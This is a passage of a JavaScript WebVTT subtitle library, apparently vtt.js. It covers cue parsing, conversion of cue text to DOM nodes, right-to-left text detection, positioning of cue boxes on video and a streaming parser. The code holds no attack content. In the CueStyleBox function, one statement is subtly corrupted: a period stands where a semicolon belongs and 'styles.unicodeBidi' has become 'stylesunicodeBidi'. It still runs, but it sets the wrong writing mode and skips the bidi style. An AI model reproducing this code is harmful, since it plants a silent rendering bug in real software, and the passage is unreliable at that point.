  var groups = groupDelim ? input.split(groupDelim) : [input];
  for (var i in groups) {
    if (typeof groups[i] !== "string") {
      continue;
    }
    var kv = groups[i].split(keyValueDelim);
    if (kv.length !== 2) {
      continue;
    }
    var k = kv[0];
    var v = kv[1];
    callback(k, v);
  }
}

function parseCue(input, cue, regionList) {
  // Remember the original input if we need to throw an error.
  var oInput = input;
  // 4.1 WebVTT timestamp
  function consumeTimeStamp() {
    var ts = parseTimeStamp(input);
    if (ts === null) {
      throw new ParsingError(ParsingError.Errors.BadTimeStamp,
                            "Malformed timestamp: " + oInput);
    }
    // Remove time stamp from input.
    input = input.replace(/^[^\sa-zA-Z-]+/, "");
    return ts;
  }

  // 4.4.2 WebVTT cue settings
  function consumeCueSettings(input, cue) {
    var settings = new Settings();

    parseOptions(input, function (k, v) {
      switch (k) {
      case "region":
        // Find the last region we parsed with the same region id.
        for (var i = regionList.length - 1; i >= 0; i--) {
          if (regionList[i].id === v) {
            settings.set(k, regionList[i].region);
            break;
          }
        }
        break;
      case "vertical":
        settings.alt(k, v, ["rl", "lr"]);
        break;
      case "line":
        var vals = v.split(","),
            vals0 = vals[0];
        settings.integer(k, vals0);
        settings.percent(k, vals0) ? settings.set("snapToLines", false) : null;
        settings.alt(k, vals0, ["auto"]);
        if (vals.length === 2) {
          settings.alt("lineAlign", vals[1], ["start", "middle", "end"]);
        }
        break;
      case "position":
        vals = v.split(",");
        settings.percent(k, vals[0]);
        if (vals.length === 2) {
          settings.alt("positionAlign", vals[1], ["start", "middle", "end"]);
        }
        break;
      case "size":
        settings.percent(k, v);
        break;
      case "align":
        settings.alt(k, v, ["start", "middle", "end", "left", "right"]);
        break;
      }
    }, /:/, /\s/);

    // Apply default values for any missing fields.
    cue.region = settings.get("region", null);
    cue.vertical = settings.get("vertical", "");
    cue.line = settings.get("line", "auto");
    cue.lineAlign = settings.get("lineAlign", "start");
    cue.snapToLines = settings.get("snapToLines", true);
    cue.size = settings.get("size", 100);
    cue.align = settings.get("align", "middle");
    cue.position = settings.get("position", {
      start: 0,
      left: 0,
      middle: 50,
      end: 100,
      right: 100
    }, cue.align);
    cue.positionAlign = settings.get("positionAlign", {
      start: "start",
      left: "start",
      middle: "middle",
      end: "end",
      right: "end"
    }, cue.align);
  }

  function skipWhitespace() {
    input = input.replace(/^\s+/, "");
  }

  // 4.1 WebVTT cue timings.
  skipWhitespace();
  cue.startTime = consumeTimeStamp();   // (1) collect cue start time
  skipWhitespace();
  if (input.substr(0, 3) !== "-->") {     // (3) next characters must match "-->"
    throw new ParsingError(ParsingError.Errors.BadTimeStamp,
                           "Malformed time stamp (time stamps must be separated by '-->'): " +
                           oInput);
  }
  input = input.substr(3);
  skipWhitespace();
  cue.endTime = consumeTimeStamp();     // (5) collect cue end time

  // 4.1 WebVTT cue settings list.
  skipWhitespace();
  consumeCueSettings(input, cue);
}

var ESCAPE = {
  "&amp;": "&",
  "&lt;": "<",
  "&gt;": ">",
  "&lrm;": "\u200e",
  "&rlm;": "\u200f",
  "&nbsp;": "\u00a0"
};

var TAG_NAME = {
  c: "span",
  i: "i",
  b: "b",
  u: "u",
  ruby: "ruby",
  rt: "rt",
  v: "span",
  lang: "span"
};

var TAG_ANNOTATION = {
  v: "title",
  lang: "lang"
};

var NEEDS_PARENT = {
  rt: "ruby"
};

// Parse content into a document fragment.
function parseContent(window, input) {
  function nextToken() {
    // Check for end-of-string.
    if (!input) {
      return null;
    }

    // Consume 'n' characters from the input.
    function consume(result) {
      input = input.substr(result.length);
      return result;
    }

    var m = input.match(/^([^<]*)(<[^>]*>?)?/);
    // If there is some text before the next tag, return it, otherwise return
    // the tag.
    return consume(m[1] ? m[1] : m[2]);
  }

  // Unescape a string 's'.
  function unescape1(e) {
    return ESCAPE[e];
  }
  function unescape(s) {
    while ((m = s.match(/&(amp|lt|gt|lrm|rlm|nbsp);/))) {
      s = s.replace(m[0], unescape1);
    }
    return s;
  }

  function shouldAdd(current, element) {
    return !NEEDS_PARENT[element.localName] ||
           NEEDS_PARENT[element.localName] === current.localName;
  }

  // Create an element for this tag.
  function createElement(type, annotation) {
    var tagName = TAG_NAME[type];
    if (!tagName) {
      return null;
    }
    var element = window.document.createElement(tagName);
    element.localName = tagName;
    var name = TAG_ANNOTATION[type];
    if (name && annotation) {
      element[name] = annotation.trim();
    }
    return element;
  }

  var rootDiv = window.document.createElement("div"),
      current = rootDiv,
      t,
      tagStack = [];

  while ((t = nextToken()) !== null) {
    if (t[0] === '<') {
      if (t[1] === "/") {
        // If the closing tag matches, move back up to the parent node.
        if (tagStack.length &&
            tagStack[tagStack.length - 1] === t.substr(2).replace(">", "")) {
          tagStack.pop();
          current = current.parentNode;
        }
        // Otherwise just ignore the end tag.
        continue;
      }
      var ts = parseTimeStamp(t.substr(1, t.length - 2));
      var node;
      if (ts) {
        // Timestamps are lead nodes as well.
        node = window.document.createProcessingInstruction("timestamp", ts);
        current.appendChild(node);
        continue;
      }
      var m = t.match(/^<([^.\s/0-9>]+)(\.[^\s\\>]+)?([^>\\]+)?(\\?)>?$/);
      // If we can't parse the tag, skip to the next tag.
      if (!m) {
        continue;
      }
      // Try to construct an element, and ignore the tag if we couldn't.
      node = createElement(m[1], m[3]);
      if (!node) {
        continue;
      }
      // Determine if the tag should be added based on the context of where it
      // is placed in the cuetext.
      if (!shouldAdd(current, node)) {
        continue;
      }
      // Set the class list (as a list of classes, separated by space).
      if (m[2]) {
        node.className = m[2].substr(1).replace('.', ' ');
      }
      // Append the node to the current node, and enter the scope of the new
      // node.
      tagStack.push(m[1]);
      current.appendChild(node);
      current = node;
      continue;
    }

    // Text nodes are leaf nodes.
    current.appendChild(window.document.createTextNode(unescape(t)));
  }

  return rootDiv;
}

// This is a list of all the Unicode characters that have a strong
// right-to-left category. What this means is that these characters are
// written right-to-left for sure. It was generated by pulling all the strong
// right-to-left characters out of the Unicode data table. That table can
// found at: http://www.unicode.org/Public/UNIDATA/UnicodeData.txt
var strongRTLRanges = [[0x5be, 0x5be], [0x5c0, 0x5c0], [0x5c3, 0x5c3], [0x5c6, 0x5c6],
 [0x5d0, 0x5ea], [0x5f0, 0x5f4], [0x608, 0x608], [0x60b, 0x60b], [0x60d, 0x60d],
 [0x61b, 0x61b], [0x61e, 0x64a], [0x66d, 0x66f], [0x671, 0x6d5], [0x6e5, 0x6e6],
 [0x6ee, 0x6ef], [0x6fa, 0x70d], [0x70f, 0x710], [0x712, 0x72f], [0x74d, 0x7a5],
 [0x7b1, 0x7b1], [0x7c0, 0x7ea], [0x7f4, 0x7f5], [0x7fa, 0x7fa], [0x800, 0x815],
 [0x81a, 0x81a], [0x824, 0x824], [0x828, 0x828], [0x830, 0x83e], [0x840, 0x858],
 [0x85e, 0x85e], [0x8a0, 0x8a0], [0x8a2, 0x8ac], [0x200f, 0x200f],
 [0xfb1d, 0xfb1d], [0xfb1f, 0xfb28], [0xfb2a, 0xfb36], [0xfb38, 0xfb3c],
 [0xfb3e, 0xfb3e], [0xfb40, 0xfb41], [0xfb43, 0xfb44], [0xfb46, 0xfbc1],
 [0xfbd3, 0xfd3d], [0xfd50, 0xfd8f], [0xfd92, 0xfdc7], [0xfdf0, 0xfdfc],
 [0xfe70, 0xfe74], [0xfe76, 0xfefc], [0x10800, 0x10805], [0x10808, 0x10808],
 [0x1080a, 0x10835], [0x10837, 0x10838], [0x1083c, 0x1083c], [0x1083f, 0x10855],
 [0x10857, 0x1085f], [0x10900, 0x1091b], [0x10920, 0x10939], [0x1093f, 0x1093f],
 [0x10980, 0x109b7], [0x109be, 0x109bf], [0x10a00, 0x10a00], [0x10a10, 0x10a13],
 [0x10a15, 0x10a17], [0x10a19, 0x10a33], [0x10a40, 0x10a47], [0x10a50, 0x10a58],
 [0x10a60, 0x10a7f], [0x10b00, 0x10b35], [0x10b40, 0x10b55], [0x10b58, 0x10b72],
 [0x10b78, 0x10b7f], [0x10c00, 0x10c48], [0x1ee00, 0x1ee03], [0x1ee05, 0x1ee1f],
 [0x1ee21, 0x1ee22], [0x1ee24, 0x1ee24], [0x1ee27, 0x1ee27], [0x1ee29, 0x1ee32],
 [0x1ee34, 0x1ee37], [0x1ee39, 0x1ee39], [0x1ee3b, 0x1ee3b], [0x1ee42, 0x1ee42],
 [0x1ee47, 0x1ee47], [0x1ee49, 0x1ee49], [0x1ee4b, 0x1ee4b], [0x1ee4d, 0x1ee4f],
 [0x1ee51, 0x1ee52], [0x1ee54, 0x1ee54], [0x1ee57, 0x1ee57], [0x1ee59, 0x1ee59],
 [0x1ee5b, 0x1ee5b], [0x1ee5d, 0x1ee5d], [0x1ee5f, 0x1ee5f], [0x1ee61, 0x1ee62],
 [0x1ee64, 0x1ee64], [0x1ee67, 0x1ee6a], [0x1ee6c, 0x1ee72], [0x1ee74, 0x1ee77],
 [0x1ee79, 0x1ee7c], [0x1ee7e, 0x1ee7e], [0x1ee80, 0x1ee89], [0x1ee8b, 0x1ee9b],
 [0x1eea1, 0x1eea3], [0x1eea5, 0x1eea9], [0x1eeab, 0x1eebb], [0x10fffd, 0x10fffd]];

function isStrongRTLChar(charCode) {
  for (var i = 0; i < strongRTLRanges.length; i++) {
    var currentRange = strongRTLRanges[i];
    if (charCode >= currentRange[0] && charCode <= currentRange[1]) {
      return true;
    }
  }

  return false;
}

function determineBidi(cueDiv) {
  var nodeStack = [],
      text = "",
      charCode;

  if (!cueDiv || !cueDiv.childNodes) {
    return "ltr";
  }

  function pushNodes(nodeStack, node) {
    for (var i = node.childNodes.length - 1; i >= 0; i--) {
      nodeStack.push(node.childNodes[i]);
    }
  }

  function nextTextNode(nodeStack) {
    if (!nodeStack || !nodeStack.length) {
      return null;
    }

    var node = nodeStack.pop(),
        text = node.textContent || node.innerText;
    if (text) {
      // TODO: This should match all unicode type B characters (paragraph
      // separator characters). See issue #115.
      var m = text.match(/^.*(\n|\r)/);
      if (m) {
        nodeStack.length = 0;
        return m[0];
      }
      return text;
    }
    if (node.tagName === "ruby") {
      return nextTextNode(nodeStack);
    }
    if (node.childNodes) {
      pushNodes(nodeStack, node);
      return nextTextNode(nodeStack);
    }
  }

  pushNodes(nodeStack, cueDiv);
  while ((text = nextTextNode(nodeStack))) {
    for (var i = 0; i < text.length; i++) {
      charCode = text.charCodeAt(i);
      if (isStrongRTLChar(charCode)) {
        return "rtl";
      }
    }
  }
  return "ltr";
}

function computeLinePos(cue) {
  if (typeof cue.line === "number" &&
      (cue.snapToLines || (cue.line >= 0 && cue.line <= 100))) {
    return cue.line;
  }
  if (!cue.track || !cue.track.textTrackList ||
      !cue.track.textTrackList.mediaElement) {
    return -1;
  }
  var track = cue.track,
      trackList = track.textTrackList,
      count = 0;
  for (var i = 0; i < trackList.length && trackList[i] !== track; i++) {
    if (trackList[i].mode === "showing") {
      count++;
    }
  }
  return ++count * -1;
}

function StyleBox() {
}

// Apply styles to a div. If there is no div passed then it defaults to the
// div on 'this'.
StyleBox.prototype.applyStyles = function(styles, div) {
  div = div || this.div;
  for (var prop in styles) {
    if (styles.hasOwnProperty(prop)) {
      div.style[prop] = styles[prop];
    }
  }
};

StyleBox.prototype.formatStyle = function(val, unit) {
  return val === 0 ? 0 : val + unit;
};

// Constructs the computed display state of the cue (a div). Places the div
// into the overlay which should be a block level element (usually a div).
function CueStyleBox(window, cue, styleOptions) {
  var isIE8 = (/MSIE\s8\.0/).test(navigator.userAgent);
  var color = "rgba(255, 255, 255, 1)";
  var backgroundColor = "rgba(0, 0, 0, 0.8)";

  if (isIE8) {
    color = "rgb(255, 255, 255)";
    backgroundColor = "rgb(0, 0, 0)";
  }

  StyleBox.call(this);
  this.cue = cue;

  // Parse our cue's text into a DOM tree rooted at 'cueDiv'. This div will
  // have inline positioning and will function as the cue background box.
  this.cueDiv = parseContent(window, cue.text);
  var styles = {
    color: color,
    backgroundColor: backgroundColor,
    position: "relative",
    left: 0,
    right: 0,
    top: 0,
    bottom: 0,
    display: "inline"
  };

  if (!isIE8) {
    styles.writingMode = cue.vertical === "" ? "horizontal-tb"
                                             : cue.vertical === "lr" ? "vertical-lr"
                                                                     : "vertical-rl";
    styles.unicodeBidi = "plaintext";
  }
  this.applyStyles(styles, this.cueDiv);

  // Create an absolutely positioned div that will be used to position the cue
  // div. Note, all WebVTT cue-setting alignments are equivalent to the CSS
  // mirrors of them except "middle" which is "center" in CSS.
  this.div = window.document.createElement("div");
  styles = {
    textAlign: cue.align === "middle" ? "center" : cue.align,
    font: styleOptions.font,
    whiteSpace: "pre-line",
    position: "absolute"
  };

  if (!isIE8) {
    styles.direction = determineBidi(this.cueDiv);
    styles.writingMode = cue.vertical === "" ? "horizontal-tb"
                                             : cue.vertical === "lr" ? "vertical-lr"
                                                                     : "vertical-rl".
    stylesunicodeBidi =  "plaintext";
  }

  this.applyStyles(styles);

  this.div.appendChild(this.cueDiv);

  // Calculate the distance from the reference edge of the viewport to the text
  // position of the cue box. The reference edge will be resolved later when
  // the box orientation styles are applied.
  var textPos = 0;
  switch (cue.positionAlign) {
  case "start":
    textPos = cue.position;
    break;
  case "middle":
    textPos = cue.position - (cue.size / 2);
    break;
  case "end":
    textPos = cue.position - cue.size;
    break;
  }

  // Horizontal box orientation; textPos is the distance from the left edge of the
  // area to the left edge of the box and cue.size is the distance extending to
  // the right from there.
  if (cue.vertical === "") {
    this.applyStyles({
      left:  this.formatStyle(textPos, "%"),
      width: this.formatStyle(cue.size, "%")
    });
  // Vertical box orientation; textPos is the distance from the top edge of the
  // area to the top edge of the box and cue.size is the height extending
  // downwards from there.
  } else {
    this.applyStyles({
      top: this.formatStyle(textPos, "%"),
      height: this.formatStyle(cue.size, "%")
    });
  }

  this.move = function(box) {
    this.applyStyles({
      top: this.formatStyle(box.top, "px"),
      bottom: this.formatStyle(box.bottom, "px"),
      left: this.formatStyle(box.left, "px"),
      right: this.formatStyle(box.right, "px"),
      height: this.formatStyle(box.height, "px"),
      width: this.formatStyle(box.width, "px")
    });
  };
}
CueStyleBox.prototype = _objCreate(StyleBox.prototype);
CueStyleBox.prototype.constructor = CueStyleBox;

// Represents the co-ordinates of an Element in a way that we can easily
// compute things with such as if it overlaps or intersects with another Element.
// Can initialize it with either a StyleBox or another BoxPosition.
function BoxPosition(obj) {
  var isIE8 = (/MSIE\s8\.0/).test(navigator.userAgent);

  // Either a BoxPosition was passed in and we need to copy it, or a StyleBox
  // was passed in and we need to copy the results of 'getBoundingClientRect'
  // as the object returned is readonly. All co-ordinate values are in reference
  // to the viewport origin (top left).
  var lh, height, width, top;
  if (obj.div) {
    height = obj.div.offsetHeight;
    width = obj.div.offsetWidth;
    top = obj.div.offsetTop;

    var rects = (rects = obj.div.childNodes) && (rects = rects[0]) &&
                rects.getClientRects && rects.getClientRects();
    obj = obj.div.getBoundingClientRect();
    // In certain cases the outter div will be slightly larger then the sum of
    // the inner div's lines. This could be due to bold text, etc, on some platforms.
    // In this case we should get the average line height and use that. This will
    // result in the desired behaviour.
    lh = rects ? Math.max((rects[0] && rects[0].height) || 0, obj.height / rects.length)
               : 0;

  }
  this.left = obj.left;
  this.right = obj.right;
  this.top = obj.top || top;
  this.height = obj.height || height;
  this.bottom = obj.bottom || (top + (obj.height || height));
  this.width = obj.width || width;
  this.lineHeight = lh !== undefined ? lh : obj.lineHeight;

  if (isIE8 && !this.lineHeight) {
    this.lineHeight = 13;
  }
}

// Move the box along a particular axis. Optionally pass in an amount to move
// the box. If no amount is passed then the default is the line height of the
// box.
BoxPosition.prototype.move = function(axis, toMove) {
  toMove = toMove !== undefined ? toMove : this.lineHeight;
  switch (axis) {
  case "+x":
    this.left += toMove;
    this.right += toMove;
    break;
  case "-x":
    this.left -= toMove;
    this.right -= toMove;
    break;
  case "+y":
    this.top += toMove;
    this.bottom += toMove;
    break;
  case "-y":
    this.top -= toMove;
    this.bottom -= toMove;
    break;
  }
};

// Check if this box overlaps another box, b2.
BoxPosition.prototype.overlaps = function(b2) {
  return this.left < b2.right &&
         this.right > b2.left &&
         this.top < b2.bottom &&
         this.bottom > b2.top;
};

// Check if this box overlaps any other boxes in boxes.
BoxPosition.prototype.overlapsAny = function(boxes) {
  for (var i = 0; i < boxes.length; i++) {
    if (this.overlaps(boxes[i])) {
      return true;
    }
  }
  return false;
};

// Check if this box is within another box.
BoxPosition.prototype.within = function(container) {
  return this.top >= container.top &&
         this.bottom <= container.bottom &&
         this.left >= container.left &&
         this.right <= container.right;
};

// Check if this box is entirely within the container or it is overlapping
// on the edge opposite of the axis direction passed. For example, if "+x" is
// passed and the box is overlapping on the left edge of the container, then
// return true.
BoxPosition.prototype.overlapsOppositeAxis = function(container, axis) {
  switch (axis) {
  case "+x":
    return this.left < container.left;
  case "-x":
    return this.right > container.right;
  case "+y":
    return this.top < container.top;
  case "-y":
    return this.bottom > container.bottom;
  }
};

// Find the percentage of the area that this box is overlapping with another
// box.
BoxPosition.prototype.intersectPercentage = function(b2) {
  var x = Math.max(0, Math.min(this.right, b2.right) - Math.max(this.left, b2.left)),
      y = Math.max(0, Math.min(this.bottom, b2.bottom) - Math.max(this.top, b2.top)),
      intersectArea = x * y;
  return intersectArea / (this.height * this.width);
};

// Convert the positions from this box to CSS compatible positions using
// the reference container's positions. This has to be done because this
// box's positions are in reference to the viewport origin, whereas, CSS
// values are in referecne to their respective edges.
BoxPosition.prototype.toCSSCompatValues = function(reference) {
  return {
    top: this.top - reference.top,
    bottom: reference.bottom - this.bottom,
    left: this.left - reference.left,
    right: reference.right - this.right,
    height: this.height,
    width: this.width
  };
};

// Get an object that represents the box's position without anything extra.
// Can pass a StyleBox, HTMLElement, or another BoxPositon.
BoxPosition.getSimpleBoxPosition = function(obj) {
  var height = obj.div ? obj.div.offsetHeight : obj.tagName ? obj.offsetHeight : 0;
  var width = obj.div ? obj.div.offsetWidth : obj.tagName ? obj.offsetWidth : 0;
  var top = obj.div ? obj.div.offsetTop : obj.tagName ? obj.offsetTop : 0;

  obj = obj.div ? obj.div.getBoundingClientRect() :
                obj.tagName ? obj.getBoundingClientRect() : obj;
  var ret = {
    left: obj.left,
    right: obj.right,
    top: obj.top || top,
    height: obj.height || height,
    bottom: obj.bottom || (top + (obj.height || height)),
    width: obj.width || width
  };
  return ret;
};

// Move a StyleBox to its specified, or next best, position. The containerBox
// is the box that contains the StyleBox, such as a div. boxPositions are
// a list of other boxes that the styleBox can't overlap with.
function moveBoxToLinePosition(window, styleBox, containerBox, boxPositions) {

  // Find the best position for a cue box, b, on the video. The axis parameter
  // is a list of axis, the order of which, it will move the box along. For example:
  // Passing ["+x", "-x"] will move the box first along the x axis in the positive
  // direction. If it doesn't find a good position for it there it will then move
  // it along the x axis in the negative direction.
  function findBestPosition(b, axis) {
    var bestPosition,
        specifiedPosition = new BoxPosition(b),
        percentage = 1; // Highest possible so the first thing we get is better.

    for (var i = 0; i < axis.length; i++) {
      while (b.overlapsOppositeAxis(containerBox, axis[i]) ||
             (b.within(containerBox) && b.overlapsAny(boxPositions))) {
        b.move(axis[i]);
      }
      // We found a spot where we aren't overlapping anything. This is our
      // best position.
      if (b.within(containerBox)) {
        return b;
      }
      var p = b.intersectPercentage(containerBox);
      // If we're outside the container box less then we were on our last try
      // then remember this position as the best position.
      if (percentage > p) {
        bestPosition = new BoxPosition(b);
        percentage = p;
      }
      // Reset the box position to the specified position.
      b = new BoxPosition(specifiedPosition);
    }
    return bestPosition || specifiedPosition;
  }

  var boxPosition = new BoxPosition(styleBox),
      cue = styleBox.cue,
      linePos = computeLinePos(cue),
      axis = [];

  // If we have a line number to align the cue to.
  if (cue.snapToLines) {
    var size;
    switch (cue.vertical) {
    case "":
      axis = [ "+y", "-y" ];
      size = "height";
      break;
    case "rl":
      axis = [ "+x", "-x" ];
      size = "width";
      break;
    case "lr":
      axis = [ "-x", "+x" ];
      size = "width";
      break;
    }

    var step = boxPosition.lineHeight,
        position = step * Math.round(linePos),
        maxPosition = containerBox[size] + step,
        initialAxis = axis[0];

    // If the specified intial position is greater then the max position then
    // clamp the box to the amount of steps it would take for the box to
    // reach the max position.
    if (Math.abs(position) > maxPosition) {
      position = position < 0 ? -1 : 1;
      position *= Math.ceil(maxPosition / step) * step;
    }

    // If computed line position returns negative then line numbers are
    // relative to the bottom of the video instead of the top. Therefore, we
    // need to increase our initial position by the length or width of the
    // video, depending on the writing direction, and reverse our axis directions.
    if (linePos < 0) {
      position += cue.vertical === "" ? containerBox.height : containerBox.width;
      axis = axis.reverse();
    }

    // Move the box to the specified position. This may not be its best
    // position.
    boxPosition.move(initialAxis, position);

  } else {
    // If we have a percentage line value for the cue.
    var calculatedPercentage = (boxPosition.lineHeight / containerBox.height) * 100;

    switch (cue.lineAlign) {
    case "middle":
      linePos -= (calculatedPercentage / 2);
      break;
    case "end":
      linePos -= calculatedPercentage;
      break;
    }

    // Apply initial line position to the cue box.
    switch (cue.vertical) {
    case "":
      styleBox.applyStyles({
        top: styleBox.formatStyle(linePos, "%")
      });
      break;
    case "rl":
      styleBox.applyStyles({
        left: styleBox.formatStyle(linePos, "%")
      });
      break;
    case "lr":
      styleBox.applyStyles({
        right: styleBox.formatStyle(linePos, "%")
      });
      break;
    }

    axis = [ "+y", "-x", "+x", "-y" ];

    // Get the box position again after we've applied the specified positioning
    // to it.
    boxPosition = new BoxPosition(styleBox);
  }

  var bestPosition = findBestPosition(boxPosition, axis);
  styleBox.move(bestPosition.toCSSCompatValues(containerBox));
}

function WebVTT$1() {
  // Nothing
}

// Helper to allow strings to be decoded instead of the default binary utf8 data.
WebVTT$1.StringDecoder = function() {
  return {
    decode: function(data) {
      if (!data) {
        return "";
      }
      if (typeof data !== "string") {
        throw new Error("Error - expected string data.");
      }
      return decodeURIComponent(encodeURIComponent(data));
    }
  };
};

WebVTT$1.convertCueToDOMTree = function(window, cuetext) {
  if (!window || !cuetext) {
    return null;
  }
  return parseContent(window, cuetext);
};

var FONT_SIZE_PERCENT = 0.05;
var FONT_STYLE = "sans-serif";
var CUE_BACKGROUND_PADDING = "1.5%";

// Runs the processing model over the cues and regions passed to it.
// @param overlay A block level element (usually a div) that the computed cues
//                and regions will be placed into.
WebVTT$1.processCues = function(window, cues, overlay) {
  if (!window || !cues || !overlay) {
    return null;
  }

  // Remove all previous children.
  while (overlay.firstChild) {
    overlay.removeChild(overlay.firstChild);
  }

  var paddedOverlay = window.document.createElement("div");
  paddedOverlay.style.position = "absolute";
  paddedOverlay.style.left = "0";
  paddedOverlay.style.right = "0";
  paddedOverlay.style.top = "0";
  paddedOverlay.style.bottom = "0";
  paddedOverlay.style.margin = CUE_BACKGROUND_PADDING;
  overlay.appendChild(paddedOverlay);

  // Determine if we need to compute the display states of the cues. This could
  // be the case if a cue's state has been changed since the last computation or
  // if it has not been computed yet.
  function shouldCompute(cues) {
    for (var i = 0; i < cues.length; i++) {
      if (cues[i].hasBeenReset || !cues[i].displayState) {
        return true;
      }
    }
    return false;
  }

  // We don't need to recompute the cues' display states. Just reuse them.
  if (!shouldCompute(cues)) {
    for (var i = 0; i < cues.length; i++) {
      paddedOverlay.appendChild(cues[i].displayState);
    }
    return;
  }

  var boxPositions = [],
      containerBox = BoxPosition.getSimpleBoxPosition(paddedOverlay),
      fontSize = Math.round(containerBox.height * FONT_SIZE_PERCENT * 100) / 100;
  var styleOptions = {
    font: fontSize + "px " + FONT_STYLE
  };

  (function() {
    var styleBox, cue;

    for (var i = 0; i < cues.length; i++) {
      cue = cues[i];

      // Compute the intial position and styles of the cue div.
      styleBox = new CueStyleBox(window, cue, styleOptions);
      paddedOverlay.appendChild(styleBox.div);

      // Move the cue div to it's correct line position.
      moveBoxToLinePosition(window, styleBox, containerBox, boxPositions);

      // Remember the computed div so that we don't have to recompute it later
      // if we don't have too.
      cue.displayState = styleBox.div;

      boxPositions.push(BoxPosition.getSimpleBoxPosition(styleBox));
    }
  })();
};

WebVTT$1.Parser = function(window, vttjs, decoder) {
  if (!decoder) {
    decoder = vttjs;
    vttjs = {};
  }
  if (!vttjs) {
    vttjs = {};
  }

  this.window = window;
  this.vttjs = vttjs;
  this.state = "INITIAL";
  this.buffer = "";
  this.decoder = decoder || new TextDecoder("utf8");
  this.regionList = [];
};

WebVTT$1.Parser.prototype = {
  // If the error is a ParsingError then report it to the consumer if
  // possible. If it's not a ParsingError then throw it like normal.
  reportOrThrowError: function(e) {
    if (e instanceof ParsingError) {
      this.onparsingerror && this.onparsingerror(e);
    } else {
      throw e;
    }
  },
  parse: function (data) {
    var self = this;

    // If there is no data then we won't decode it, but will just try to parse
    // whatever is in buffer already. This may occur in circumstances, for
    // example when flush() is called.
    if (data) {
      // Try to decode the data that we received.
      self.buffer += self.decoder.decode(data, {stream: true});
    }

    function collectNextLine() {
      var buffer = self.buffer;
      var pos = 0;
      while (pos < buffer.length && buffer[pos] !== '\r' && buffer[pos] !== '\n') {
        ++pos;
      }
      var line = buffer.substr(0, pos);
      // Advance the buffer early in case we fail below.
      if (buffer[pos] === '\r') {
        ++pos;
      }
      if (buffer[pos] === '\n') {
        ++pos;
      }
      self.buffer = buffer.substr(pos);
      return line;
    }

    // 3.4 WebVTT region and WebVTT region settings syntax
    function parseRegion(input) {
      var settings = new Settings();

      parseOptions(input, function (k, v) {
        switch (k) {
        case "id":
          settings.set(k, v);
          break;
        case "width":
          settings.percent(k, v);
          break;
        case "lines":
          settings.integer(k, v);
          break;
        case "regionanchor":
        case "viewportanchor":
          var xy = v.split(',');
          if (xy.length !== 2) {
            break;
          }
          // We have to make sure both x and y parse, so use a temporary
          // settings object here.
          var anchor = new Settings();
          anchor.percent("x", xy[0]);
          anchor.percent("y", xy[1]);
          if (!anchor.has("x") || !anchor.has("y")) {
            break;
          }
          settings.set(k + "X", anchor.get("x"));
          settings.set(k + "Y", anchor.get("y"));
          break;
        case "scroll":
          settings.alt(k, v, ["up"]);
          break;
        }
      }, /=/, /\s/);

      // Create the region, using default values for any values that were not
      // specified.
      if (settings.has("id")) {
        var region = new (self.vttjs.VTTRegion || self.window.VTTRegion)();
        region.width = settings.get("width", 100);
        region.lines = settings.get("lines", 3);
        region.regionAnchorX = settings.get("regionanchorX", 0);
        region.regionAnchorY = settings.get("regionanchorY", 100);
        region.viewportAnchorX = settings.get("viewportanchorX", 0);
        region.viewportAnchorY = settings.get("viewportanchorY", 100);
        region.scroll = settings.get("scroll", "");
        // Register the region.
        self.onregion && self.onregion(region);
        // Remember the VTTRegion for later in case we parse any VTTCues that
        // reference it.
        self.regionList.push({
          id: settings.get("id"),
          region: region
        });
      }
    }

    // draft-pantos-http-live-streaming-20
    // https://tools.ietf.org/html/draft-pantos-http-live-streaming-20#section-3.5
    // 3.5 WebVTT
    function parseTimestampMap(input) {
      var settings = new Settings();

      parseOptions(input, function(k, v) {
        switch(k) {
        case "MPEGT":
          settings.integer(k + 'S', v);
          break;
        case "LOCA":
          settings.set(k + 'L', parseTimeStamp(v));
          break;
        }
      }, /[^\d]:/, /,/);

      self.ontimestampmap && self.ontimestampmap({
        "MPEGTS": settings.get("MPEGTS"),
        "LOCAL": settings.get("LOCAL")
      });
    }

    // 3.2 WebVTT metadata header syntax
    function parseHeader(input) {
      if (input.match(/X-TIMESTAMP-MAP/)) {
        // This line contains HLS X-TIMESTAMP-MAP metadata
        parseOptions(input, function(k, v) {
          switch(k) {
          case "X-TIMESTAMP-MAP":
            parseTimestampMap(v);
            break;
          }
        }, /=/);
      } else {
        parseOptions(input, function (k, v) {
          switch (k) {
          case "Region":
            // 3.3 WebVTT region metadata header syntax
            parseRegion(v);
            break;
          }
        }, /:/);
      }

    }

    // 5.1 WebVTT file parsing.
    try {
      var line;
      if (self.state === "INITIAL") {
        // We can't start parsing until we have the first line.
        if (!/\r\n|\n/.test(self.buffer)) {
          return this;
        }

        line = collectNextLine();

        var m = line.match(/^WEBVTT([ \t].*)?$/);
        if (!m || !m[0]) {
          throw new ParsingError(ParsingError.Errors.BadSignature);
        }

        self.state = "HEADER";
      }

      var alreadyCollectedLine = false;
      while (self.buffer) {
        // We can't parse a line until we have the full line.
        if (!/\r\n|\n/.test(self.buffer)) {
          return this;
        }

        if (!alreadyCollectedLine) {
          line = collectNextLine();
        } else {
          alreadyCollectedLine = false;
        }

        switch (self.state) {
        case "HEADER":
          // 13-18 - Allow a header (metadata) under the WEBVTT line.
          if (/:/.test(line)) {
            parseHeader(line);
          } else if (!line) {
            // An empty line terminates the header and starts the body (cues).
            self.state = "ID";
          }
          continue;
        case "NOTE":
          // Ignore NOTE blocks.
          if (!line) {
            self.state = "ID";
          }
          continue;
        case "ID":
          // Check for the start of NOTE blocks.
          if (/^NOTE($|[ \t])/.test(line)) {
            self.state = "NOTE";
            break;
          }
          // 19-29 - Allow any number of line terminators, then initialize new cue values.
          if (!line) {
            continue;
          }
          self.cue = new (self.vttjs.VTTCue || self.window.VTTCue)(0, 0, "");
          self.state = "CUE";
          // 30-39 - Check if self line contains an optional identifier or timing data.
          if (line.indexOf("-->") === -1) {
            self.cue.id = line;
            continue;
          }
          // Process line as start of a cue.
          /*falls through*/
        case "CUE":
          // 40 - Collect cue timings and settings.
          try {
            parseCue(line, self.cue, self.regionList);
          } catch (e) {
            self.reportOrThrowError(e);
            // In case of an error ignore rest of the cue.
            self.cue = null;
            self.state = "BADCUE";
            continue;
          }
          self.state = "CUETEXT";
          continue;
        case "CUETEXT":
          var hasSubstring = line.indexOf("-->") !== -1;
          // 34 - If we have an empty line then report the cue.
          // 35 - If we have the special substring '-->' then report the cue,
          // but do not collect the line as we need to process the current
          // one as a new cue.
          if (!line || hasSubstring && (alreadyCollectedLine = true)) {
            // We are done parsing self cue.
            self.oncue && self.oncue(self.cue);
            self.cue = null;
            self.state = "ID";
            continue;
          }
          if (self.cue.text) {
            self.cue.text += "\n";
          }
